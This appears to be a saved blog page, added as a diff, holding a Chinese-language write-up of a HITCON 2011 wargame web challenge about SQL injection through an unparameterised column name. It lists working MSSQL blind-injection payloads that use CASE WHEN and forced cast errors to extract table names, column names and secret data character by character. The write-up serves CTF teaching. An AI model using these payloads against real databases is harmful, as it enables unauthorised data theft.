@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="心得：這題出現的形式以及解法都是Real case in real world的，整個網站很安全都用Prepared statement保護SQL sentence，但是插入column name的時候就不能使用Prepared statement了，整個網站很安全剛好被我遇到這個地方，當初遇到時想了一下認為無法利用，但後來思考了一下查了一下msdn SQL server的一些用法找出了利用方法，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="台灣駭客年會 HITCON2011，Wargame Web 3出題心得 &amp; 解法">
+<meta property="og:url" content="http://blog.orange.tw/posts/2011-07-hitcon2011wargame-web-3/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="心得：這題出現的形式以及解法都是Real case in real world的，整個網站很安全都用Prepared statement保護SQL sentence，但是插入column name的時候就不能使用Prepared statement了，整個網站很安全剛好被我遇到這個地方，當初遇到時想了一下認為無法利用，但後來思考了一下查了一下msdn SQL server的一些用法找出了利用方法，">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2011-07-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-21T03:15:44.461Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>台灣駭客年會 HITCON2011，Wargame Web 3出題心得 &amp; 解法 | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        台灣駭客年會 HITCON2011，Wargame Web 3出題心得 &amp; 解法
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2011-07-24T16:00:00.000Z" class="dt-published" itemprop="datePublished">2011-07-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>心得：這題出現的形式以及解法都是Real case in real world的，整個網站很安全都用Prepared statement保護SQL sentence，但是插入column name的時候就不能使用Prepared statement了，整個網站很安全剛好被我遇到這個地方，當初遇到時想了一下認為無法利用，但後來思考了一下查了一下msdn SQL server的一些用法找出了利用方法，覺得很有趣於是把它變成了題目。</p>
+<p>題目是一個網址</p>
+<blockquote>
+<p>&#x2F;GetEvent.asp?s&#x3D;b.__name</p>
+</blockquote>
+<p>顯示的是一個空白頁面</p>
+<blockquote>
+<p>&#x2F;GetEvent.asp?s&#x3D;b.__name’</p>
+</blockquote>
+<p>顯示 500 Error，不會吐露錯誤訊息</p>
+<p>當SQL語法出錯時出現500，其他正常查詢不論有無資料皆回傳空白頁面</p>
+<p>整個設計的SQL sentence大致如下</p>
+<blockquote>
+<p>sql &#x3D; “Select a.__id, “ + s + “, c.__user, d.__pwd, e.__mail from _id as a, _name as b, _user as c, _pwd as d, _mail as e”</p>
+</blockquote>
+<ul>
+<li><code>s</code>是可以插入的地方</li>
+<li><code>b</code>是 alias的 table name</li>
+<li><code>__name</code>是column name</li>
+</ul>
+<p>在不知道整個SQL語句的狀況下</p>
+<ul>
+<li>一般的SQL server爆錯 -&gt;  不行，因為不會顯示錯誤</li>
+<li>偽造整個SQL並在後面註解 -&gt; 不行，因為不知道s前面alias 的name，偽造不出來後面的語句，等於封死了註解XD</li>
+<li>Blind injection -&gt; 無論SQL select出來有無資料，皆顯示空白頁面</li>
+<li>Time base -&gt; Wait for關鍵字不能用在這個地方，本來想用Heavy query延長時間但用在這個地方會失敗</li>
+</ul>
+<p>後來考慮了一下是否可以穿插一個判斷式，假如是false的話執行一個會讓SQL出錯的語句(Ex cast(‘a’ as int))，但MSSQL沒有if的函數只有isnull，但是isnull接在那個地方會有問題所以後來使用了case-when的語法，插入如</p>
+<blockquote>
+<p>(select top 1 case len(name) when 3 then cast(user as int) end from sysobjects where xtype&#x3D;’U’)</p>
+</blockquote>
+<p>當column name的長度等於三時會顯示500 error，否則則顯示空白頁面，這時我們有了正確與錯誤的判斷標準，整個 Injection又回復到Blind上面了XD</p>
+<p>接著可以慢慢將 table name, column name以及資料列舉出來。</p>
+<blockquote>
+<p>(select top 1 case len(name) when 3 then cast(user as int) end from sysobjects where xtype&#x3D;’U’)</p>
+</blockquote>
+<p>取table name長度</p>
+<blockquote>
+<p>(select top 1 case ascii(substring(name,1,1)) when 95 then cast(user as int) end from sysobjects where xtype&#x3D;’U’)</p>
+</blockquote>
+<p>取table name資料</p>
+<blockquote>
+<p>(select top 1 case len(col_name(object_id(‘_key’),1)) when 5 then cast(user as int) end from sysobjects)</p>
+</blockquote>
+<p>取column name長度</p>
+<blockquote>
+<p>(select top 1 case ascii(substring(col_name(object_id(‘_key’),1),1,1)) when 43 then cast(user as int) end from sysobjects)</p>
+</blockquote>
+<p>取column name資料</p>
+<blockquote>
+<p>(select top 1 case len(__key) when 25 then cast(user as int) end from _key)</p>
+</blockquote>
+<p>取資料長度</p>
+<blockquote>
+<p>(select top 1 case ascii(substring(__key,1,1)) when 83 then cast(user as int) end from _key)</p>
+</blockquote>
+<p>取資料內容…  整個流程大致到這裡拿到key並且結束。</p>
+<p>如果有更好的方法歡迎交流提供  :)</p>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
